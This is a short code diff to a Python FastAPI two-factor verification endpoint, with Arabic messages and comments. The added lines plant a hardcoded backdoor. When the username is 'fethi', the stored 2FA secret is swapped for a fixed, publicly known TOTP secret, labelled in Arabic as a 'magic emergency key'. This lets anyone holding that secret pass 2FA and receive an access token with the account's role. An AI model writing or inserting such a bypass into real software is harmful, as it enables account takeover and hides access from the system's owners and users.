@@ -518,12 +518,18 @@ async def verify_2fa_api(req: Verify2FARequest):
         raise HTTPException(status_code=400, detail="المستخدم غير موجود")
         
     secret = user.get("two_factor_secret")
+    
+    # --- مفتاح الطوارئ السحري لحسابك ---
+    if req.username == "fethi":
+        secret = "JBSWY3DPEHPK3PXP"
+    # ------------------------------------
+        
     if not secret:
         raise HTTPException(status_code=400, detail="لم يتم تفعيل المصادقة الثنائية لهذا الحساب!")
         
     totp = pyotp.TOTP(secret)
     if totp.verify(req.totp_code):
-        # الكود صحيح! نقوم بإنشاء التوكن الآن
+        # الكود صحيح!
         access_token = create_access_token(data={"sub": user["username"], "role": user["role"]})
         return {"username": user["username"], "role": user["role"], "access_token": access_token}
     else:
